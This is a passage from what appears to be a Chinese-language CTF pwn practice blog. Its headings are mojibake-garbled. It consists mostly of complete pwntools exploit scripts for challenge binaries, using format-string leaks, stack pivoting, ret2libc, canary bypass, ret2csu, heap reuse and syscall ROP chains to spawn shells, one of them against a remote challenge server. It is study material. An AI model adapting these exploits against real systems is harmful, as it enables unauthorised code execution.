title="åŸºæœ¬æ€è·¯"></a>åŸºæœ¬æ€è·¯</h5><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²libc+æ ˆè¿ç§»</p><h5 id="æ³„éœ²libc"><a href="#æ³„éœ²libc" class="headerlink" title="æ³„éœ²libc"></a>æ³„éœ²libc</h5><p>printfå¤„ä¸‹æ–­ç‚¹<br><code>b* 0x401254</code><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223144004.png" alt="Pasted image 20250223144004"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223152812.png" alt="Pasted image 20250223152812"><br><strong>6</strong></p><h5 id="æ³„éœ²rbp"><a href="#æ³„éœ²rbp" class="headerlink" title="æ³„éœ²rbp"></a>æ³„éœ²rbp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">p.recvuntil(&quot;What&#39;s your name?&quot;) payload&#x3D;b&#39;AAAA&#39;+b&#39;%22$p&#39; p.send(payload)p.recvuntil(&quot;Nice to meet you \n&quot;) p.recvuntil(&quot;AAAA&quot;) rbp &#x3D; int(p.recvuntil(&quot; &quot;), 16) print(hex(rbp)) pause() buf&#x3D;rbp-0x30-0x80 pop_rdi&#x3D;0x0401203 lea_ret&#x3D;0x040127f ret&#x3D;0x040101aputs_plt&#x3D;elf.plt[&#39;puts&#39;] puts_got&#x3D;elf.got[&#39;puts&#39;]payload&#x3D;p64(pop_rdi) payload+&#x3D;p64(puts_got) payload+&#x3D;p64(puts_plt) payload+&#x3D;p64(0x0401208) payload.ljust(0x80,b&#39;\x00&#39;) payload+&#x3D;p64(buf) payload+&#x3D;p64(lea_ret)p.recvuntil(&quot;Do you know stack pivating?&quot;) p.send(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>22=6+128//8</code><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223172641.png" alt="Pasted image 20250223172641"></p><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223173503.png" alt="Pasted image 20250223173503"><br><code>0xb0=0xb00-0xa50</code></p><h5 id="æœ¬åœ°exp"><a href="#æœ¬åœ°exp" class="headerlink" title="æœ¬åœ°exp"></a>æœ¬åœ°exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]elf&#x3D;ELF(&#39;.&#x2F;ezstack&#39;)libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)puts_got&#x3D;elf.got[&#39;puts&#39;]printf_got&#x3D;elf.got[&#39;printf&#39;]read_got&#x3D;elf.got[&#39;read&#39;]p&#x3D;process(&#39;.&#x2F;ezstack&#39;)#p&#x3D;remote(&#39;175.27.249.18&#39;,30150)#æ³„éœ²libc# payload1&#x3D;b&#39;AAA%8$s%9$s%10$s&#39;+p64(puts_got)+p64(printf_got)+p64(read_got)# p.sendafter(&quot;What&#39;s your name?\n&quot;,payload1)# p.recvuntil(&quot;Nice to meet you \n&quot;)# data&#x3D;p.recv(27)# puts_addr&#x3D;u64(data[3:9].ljust(8,b&#39;\x00&#39;))# printf_addr&#x3D;u64(data[9:15].ljust(8,b&#39;\x00&#39;))# read_addr&#x3D;u64(data[15:21].ljust(8,b&#39;\x00&#39;))# success(&quot;puts_addr: &quot;+hex(puts_addr))# success(&quot;printf_addr: &quot;+hex(printf_addr))# success(&quot;read_addr: &quot;+hex(read_addr)) #æ³„éœ²rbpp.recvuntil(&quot;What&#39;s your name?&quot;)payload&#x3D;b&#39;AAA%22$p&#39;p.send(payload)p.recvuntil(&quot;Nice to meet you \n&quot;)rbp &#x3D; int(p.recv(17)[3:],16)success(hex(rbp))base&#x3D;0x00007ffff7c00000  bin_sh&#x3D;libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()bin_addr&#x3D;base+bin_shpop_rdi&#x3D;0x401203leave_ret&#x3D;0x40127system_addr&#x3D;base+libc.sym[&#39;system&#39;]fake_rbp&#x3D;rbp-0xb0-8payload2&#x3D; p64(pop_rdi)+p64(bin_addr)+p64(system_addr)+b&#39;A&#39;*(128-24)+p64(fake_rbp)+p64(leave_ret)p.sendafter(&quot;Do you know stack pivating?\n&quot;,payload2)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="è¿œç¨‹exp"><a href="#è¿œç¨‹exp" class="headerlink" title="è¿œç¨‹exp"></a>è¿œç¨‹exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]elf&#x3D;ELF(&#39;.&#x2F;ezstack&#39;)libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)puts_got&#x3D;elf.got[&#39;puts&#39;]printf_got&#x3D;elf.got[&#39;printf&#39;]read_got&#x3D;elf.got[&#39;read&#39;]# p&#x3D;process(&#39;.&#x2F;ezstack&#39;)p&#x3D;remote(&#39;175.27.249.18&#39;,30999)# æ³„éœ²libc# payload1&#x3D;b&#39;AAA%8$s%9$s%10$s&#39;+p64(puts_got)+p64(printf_got)+p64(read_got)## fmtå¯¹åº”ç¬¬7ä¸ªï¼Œputs_gotå¯¹åº”ç¬¬8ä¸ª# p.sendafter(&quot;What&#39;s your name?\n&quot;,payload1)# p.recvuntil(&quot;Nice to meet you \n&quot;)# data&#x3D;p.recv(27)# puts_addr&#x3D;u64(data[3:9].ljust(8,b&#39;\x00&#39;))# printf_addr&#x3D;u64(data[9:15].ljust(8,b&#39;\x00&#39;))# read_addr&#x3D;u64(data[15:21].ljust(8,b&#39;\x00&#39;))# success(&quot;puts_addr: &quot;+hex(puts_addr))# success(&quot;printf_addr: &quot;+hex(printf_addr))# success(&quot;read_addr: &quot;+hex(read_addr))#be0#æ³„éœ²rbpp.recvuntil(&quot;What&#39;s your name?&quot;)payload&#x3D;b&#39;AAAAAAA%8$s%22$p&#39; + p64(puts_got)p.send(payload)p.recvuntil(&quot;Nice to meet you \n&quot;)p.recvuntil(&quot;AAAAAAA&quot;)puts_addr&#x3D;u64(p.recv(6).ljust(8,b&#39;\x00&#39;))success(&quot;puts_addr:&quot;+hex(puts_addr))rbp&#x3D;int(p.recv(14),16)success(&quot;rbp:&quot;+hex(rbp))base&#x3D;puts_addr-0x080e50bin_addr&#x3D;base+0x1d8678pop_rdi&#x3D;0x401203leave_ret&#x3D;0x40127fsystem_addr&#x3D;base+0x050d70 fake_rbp&#x3D;rbp-0xb0-8payload2&#x3D; p64(pop_rdi)+p64(bin_addr)+p64(system_addr)+b&#39;A&#39;*(128-24)+p64(fake_rbp)+p64(leave_ret)p.sendafter(&quot;Do you know stack pivating?\n&quot;,payload2)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h3><h4 id="Listï¼ˆDay2-25-2-24ï¼‰"><a href="#Listï¼ˆDay2-25-2-24ï¼‰" class="headerlink" title="Listï¼ˆDay2 25/2/24ï¼‰"></a>Listï¼ˆDay2 25/2/24ï¼‰</h4><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250224170216.png" alt="Pasted image 20250224170216"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">0x0000000000400acc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400ace : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400ad0 : pop r14 ; pop r15 ; ret0x0000000000400ad2 : pop r15 ; ret0x0000000000400acb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400acf : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006c0 : pop rbp ; ret0x0000000000400ad3 : pop rdi ; ret0x0000000000400ad1 : pop rsi ; pop r15 ; ret0x0000000000400acd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004005c9 : ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;] p&#x3D;process(&quot;.&#x2F;list&quot;)# p&#x3D;remote(&quot;175.27.249.18&quot;,31766)   elf&#x3D;ELF(&#39;.&#x2F;list&#39;)libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)def choice(index):    p.sendlineafter(&quot;Your option:&quot;,str(index))def change(index,content):    choice(1)    p.sendline(str(index))    p.sendline(str(content))def exit():    choice(5)&#39;&#39;&#39;0x0000000000400ad3 : pop rdi ; ret0x00000000004005c9 : ret&#39;&#39;&#39;puts_got&#x3D;elf.got[&#39;puts&#39;]puts_plt&#x3D;elf.plt[&#39;puts&#39;]rdi&#x3D;0x400ad3ret&#x3D;0x4005c9main_addr&#x3D;0x4007c1change(19,rdi)change(20,puts_got)change(21,puts_plt)change(22,main_addr)exit()p.recvuntil(&quot;\n&quot;)puts_addr&#x3D;u64(p.recv(6).ljust(8,b&#39;\x00&#39;))success(&quot;puts_addr:&quot;+hex(puts_addr))base_addr&#x3D;puts_addr-libc.sym[&#39;puts&#39;]success(&quot;base_addr:&quot;+hex(base_addr))system_addr&#x3D;base_addr+libc.sym[&#39;system&#39;]binsh_addr&#x3D;base_addr+next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))success(&quot;system_addr:&quot;+hex(system_addr))success(&quot;binsh_addr:&quot;+hex(binsh_addr))change(19,rdi)change(20,binsh_addr)change(21,system_addr)change(22,main_addr)exit()p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Normal-shellcode"><a href="#Normal-shellcode" class="headerlink" title="Normal_shellcode"></a>Normal_shellcode</h4><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250225113806.png" alt="Pasted image 20250225113806"></p><h2 id="NISACTF"><a href="#NISACTF" class="headerlink" title="NISACTF"></a>NISACTF</h2><h3 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *io&#x3D;process(&#39;.&#x2F;ez_heap&#39;)p &#x3D; ELF(&quot;ez_heap&quot;)payload &#x3D; cyclic(0x20)payload +&#x3D; b&#39;&#x2F;bin&#x2F;sh\x00&#39;io.sendline(payload)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="girl-friend"><a href="#girl-friend" class="headerlink" title="girl_friend"></a>girl_friend</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]   elf&#x3D;ELF(&#39;girlfriend&#39;)p&#x3D;process(&#39;.&#x2F;girlfriend&#39;)def choice(num):    p.recvuntil(&quot;Your choice :&quot;)    p.sendline(str(num))def add(name_size,name):    choice(1)    p.sendafter(&quot;Her name size is :&quot;,name_size)    p.sendafter(&quot;Her name is :&quot;,name)def delete(index):    choice(2)    p.sendlineafter(&#39;Index :&#39;,index)def show(index):    choice(3)    p.sendafter(&quot;Index :&quot;,index)backdoor_addr&#x3D;0x400B9Cadd(&quot;16&quot;,p64(backdoor_addr))add(&quot;40&quot;,&#39;bbbb&#39;)delete(&quot;0&quot;)delete(&quot;1&quot;)add(&quot;16&quot;,p64(backdoor_addr))show(&quot;0&quot;)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¹¤åŸæ¯"><a href="#é¹¤åŸæ¯" class="headerlink" title="é¹¤åŸæ¯"></a>é¹¤åŸæ¯</h2><h3 id="littleof-2021é¹¤åŸæ¯"><a href="#littleof-2021é¹¤åŸæ¯" class="headerlink" title="littleof(2021é¹¤åŸæ¯)"></a>littleof(2021é¹¤åŸæ¯)</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250312131636.png" alt="Pasted image 20250312131636"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]p&#x3D;process(&#39;.&#x2F;littleof&#39;)elf &#x3D; ELF(&#39;.&#x2F;littleof&#39;)libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)pl1&#x3D;&#39;a&#39;*0x49p.sendafter(&#39;overflow?\n&#39;,pl1)data&#x3D;p.recv()canary&#x3D;b&#39;\x00&#39;+data[0x49:0x49+7]canary &#x3D; int.from_bytes(canary,&#39;little&#39;)success(&#39;canary:&#39;)success(hex(canary))#ret2libc# 0x000000000040059e : ret# 0x0000000000400863 : pop rdi ; retret&#x3D;0x40059epop_rdi&#x3D;0x400863func&#x3D;0x4006E2payload2 &#x3D; b&#39;a&#39;*0x48 + p64(canary) + b&#39;a&#39;*8 + p64(pop_rdi) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;]) + p64(func)p.sendline(payload2)p.recvuntil(b&#39;win&#39;)p.recv(1)puts_addr &#x3D; u64(p.recv(6).ljust(8, b&#39;\0&#39;))success(&#39;puts_addr:&#39;)success(hex(puts_addr))libc.address &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]success(&#39;libc.address:&#39;)success(hex(libc.address))binsh &#x3D; next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))success(&#39;binsh:&#39;)success(hex(binsh))system &#x3D; libc.symbols[&#39;system&#39;]success(&#39;system:&#39;)success(hex(system))p.sendafter(&#39;overflow?\n&#39;,pl1)data&#x3D;p.recv()canary&#x3D;b&#39;\x00&#39;+data[0x49:0x49+7]canary &#x3D; int.from_bytes(canary,&#39;little&#39;)success(&#39;canary:&#39;)success(hex(canary))payload2&#x3D;b&#39;a&#39;*0x48 + p64(canary) + b&#39;a&#39;*8  +p64(ret)+p64(pop_rdi) + p64(binsh) + p64(system)p.send(payload2)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="Geek-Challenge"><a href="#Geek-Challenge" class="headerlink" title="Geek Challenge"></a><strong>Geek Challenge</strong></h2><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.arch &#x3D; &#39;amd64&#39;context.os &#x3D; &#39;linux&#39;context.log_level &#x3D; &#39;debug&#39;p &#x3D; process(&#39;.&#x2F;shellcode&#39;)shellcode &#x3D; asm(shellcraft.sh())p.sendline(shellcode)backdoor &#x3D; 0x401256p.sendline(b&quot;A&quot;*(0x18+8) + p64(backdoor))p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¹°é»‘å—å–½äº†å—ï¼ˆæ•´æ•°æº¢å‡ºï¼Œæ ˆæº¢å‡ºï¼‰"><a href="#ä¹°é»‘å—å–½äº†å—ï¼ˆæ•´æ•°æº¢å‡ºï¼Œæ ˆæº¢å‡ºï¼‰" class="headerlink" title="ä¹°é»‘å—å–½äº†å—ï¼ˆæ•´æ•°æº¢å‡ºï¼Œæ ˆæº¢å‡ºï¼‰"></a>ä¹°é»‘å—å–½äº†å—ï¼ˆæ•´æ•°æº¢å‡ºï¼Œæ ˆæº¢å‡ºï¼‰</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.arch &#x3D; &#39;amd64&#39;context.os &#x3D; &#39;linux&#39;context.log_level &#x3D; &#39;debug&#39;p &#x3D; process(&#39;.&#x2F;syscall&#39;)elf&#x3D;ELF(&#39;.&#x2F;syscall&#39;)libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)for i in range(9):    p.sendlineafter(&#39;choice:&#39;,&quot;1&quot;)    p.sendlineafter(&#39;choice:&#39;,&quot;1&quot;)p.sendlineafter(&#39;choice:&#39;,&quot;1&quot;)p.sendlineafter(&#39;choice:&#39;,&quot;2&quot;)p.sendlineafter(&#39;choice:&#39;,&quot;2&quot;)p.send(b&#39;%p&#39;)p.recvuntil(&#39;0x0x&#39;)base&#x3D;int(p.recv(12),16)-0x4090success(&#39;base:&#39;+hex(base))rdi&#x3D;base+0x11f1rsi&#x3D;base+0x11f3rax&#x3D;base+0x11f7bss&#x3D;base+0x4090rdx&#x3D;base+0x11f5syscall&#x3D;base+0x11EErop&#x3D;p64(rax)+p64(0)+p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(rdx)+p64(0x8)+p64(syscall)rop+&#x3D;p64(rax)+p64(0x3b)+p64(rdi)+p64(bss)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(syscall)payload&#x3D;b&quot;A&quot;*0x58+roppayload&#x3D;payload.ljust(0x100,b&quot;\x00&quot;)p.sendlineafter(&#39;your choice:&#39;,&quot;3&quot;)p.sendafter(&#39;feedback&#39;,payload)p.send(&#39;&#x2F;bin&#x2F;sh\x00&#39;)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="su"><a href="#su" class="headerlink" title="su~~~~"></a>su~~~~</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level &#x3D; &#39;debug&#39;context.arch &#x3D; &#39;amd64&#39;p &#x3D; process(&#39;.&#x2F;csu&#39;)elf &#x3D; ELF(&#39;.&#x2F;csu&#39;)libc &#x3D; ELF(&#39;.&#x2F;libc.so.6&#39;)#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; li &#x3D; lambda x : print(&#39;\\x1b[01;38;5;214m&#39; + x + &#39;\\x1b[0m&#39;) ll &#x3D; lambda x : print(&#39;\\x1b[01;38;5;1m&#39; + x + &#39;\\x1b[0m&#39;) s &#x3D; lambda s : p.send(s) sl &#x3D; lambda s : p.sendline(s) sa &#x3D; lambda n,s : p.sendafter(n,s) sla &#x3D; lambda n,s : p.sendlineafter(n,s) r &#x3D; lambda n : p.recv(n) rl &#x3D; lambda : p.recvline() ru &#x3D; lambda s : p.recvuntil(s) ra &#x3D; lambda : p.recvall() ia &#x3D; lambda : p.interactive() uu32 &#x3D; lambda data : u32(data.ljust(4, b&#39;\\x00&#39;)) uu64 &#x3D; lambda data : u64(data.ljust(8, b&#39;\\x00&#39;)) # u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) # u32(p.recvuntil(b&#39;\\xf7&#39;)) def g():     gdb.attach(p)     pause() #&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;def csu(rbx, rbp, r12, r13, r14, last):    mov_addr &#x3D; 0x4008E0    pop_addr &#x3D; 0x4008FA    fakeebp&#x3D;b&#39;a&#39; * 8    payload &#x3D; b&#39;a&#39; * 0x80+fakeebp    payload +&#x3D; p64(pop_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14)    payload +&#x3D; p64(1)+p64(mov_addr)    payload +&#x3D; b&#39;a&#39; * 0x38    payload +&#x3D; p64(last)    p.send(payload)sla(&quot;exit.\n&quot;,b&#39;1&#39;)puts_got &#x3D; elf.got[&#39;puts&#39;]  read_addr&#x3D;0x400798csu(0, 1, puts_got, puts_got, 0, read_addr)puts_base &#x3D; u64(p.recv(6).ljust(8,b&#39;\0&#39;))success(&#39;puts_base:&#39;+hex(puts_base))libc.address &#x3D; puts_base - libc.sym[&#39;puts&#39;]success(&#39;libc_base:&#39;+hex(libc.address))ogg&#x3D;0x4f302+libc.addresspayload2&#x3D;b&#39;a&#39;*0x80+b&#39;a&#39;*8+p64(ogg)p.send(payload2)ia()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level &#x3D; &#39;debug&#39;context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]p&#x3D;process(&#39;.&#x2F;fmt&#39;)def dbg():    gdb.attach(p)p.sendlineafter(&#39;ID:\n&#39;,&#39;A&#39;)p.sendafter(&#39;name?\n&#39;,&#39;%13$p%14$p&#39;)p.recvuntil(&#39;0x&#39;)canary &#x3D; int(p.recv(16), 16)success(&#39;canary &#x3D;&gt;&gt; &#39; + hex(canary))p.recvuntil(&#39;0x&#39;)rbp &#x3D; int(p.recv(12), 16)success(&#39;rbp &#x3D;&gt;&gt; &#39; + hex(rbp))ret&#x3D;rbp-0x18p.send(p64(ret+1)+b&#39;A&#39; * 0x30 + p64(canary) + p64(rbp)+ b&#39;\xEC&#39;)# gdb.attach(p)# pause()p.sendafter(&#39;name?\n&#39;,b&#39;%18c%6$hhn&#39;)p.sendafter(&#39;say?\n&#39;,b&#39;A&#39; * 0x38 + p64(canary) + p64(rbp)+ b&#39;\x85&#39;)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="çœŸçš„èƒ½èµ°åˆ°åé—¨å—"><a href="#çœŸçš„èƒ½èµ°åˆ°åé—¨å—" class="headerlink" title="çœŸçš„èƒ½èµ°åˆ°åé—¨å—"></a>çœŸçš„èƒ½èµ°åˆ°åé—¨å—</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"> from pwn import *context.log_level &#x3D; &#39;debug&#39;context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]p&#x3D;process(&#39;.&#x2F;fmt&#39;)def dbg():    gdb.attach(p)p.sendlineafter(&#39;ID:\n&#39;,&#39;A&#39;)p.sendafter(&#39;name?\n&#39;,&#39;%13$p%14$p&#39;)p.recvuntil(&#39;0x&#39;)canary &#x3D; int(p.recv(16), 16)success(&#39;canary &#x3D;&gt;&gt; &#39; + hex(canary))p.recvuntil(&#39;0x&#39;)rbp &#x3D; int(p.recv(12), 16)success(&#39;rbp &#x3D;&gt;&gt; &#39; + hex(rbp))ret&#x3D;rbp-0x18 #åŠ¨è°ƒå¯çŸ¥æ­¤ä¸ºè¿”å›åœ°å€rbp-0x18p.send(p64(ret+1)+b&#39;A&#39; * 0x30 + p64(canary) + p64(rbp)+ b&#39;\xEC&#39;) #ret+1å³ä¸ºæœ€ç»ˆè¦ä¿®æ”¹çš„å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚# gdb.attach(p)# pause()p.sendafter(&#39;name?\n&#39;,b&#39;%18c%6$hhn&#39;)p.sendafter(&#39;say?\n&#39;,b&#39;A&#39; * 0x38 + p64(canary) + p64(rbp)+ b&#39;\x85&#39;)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç©ºè°ƒ"><a href="#ç©ºè°ƒ" class="headerlink" title="ç©ºè°ƒ"></a>ç©ºè°ƒ</h3><p><img 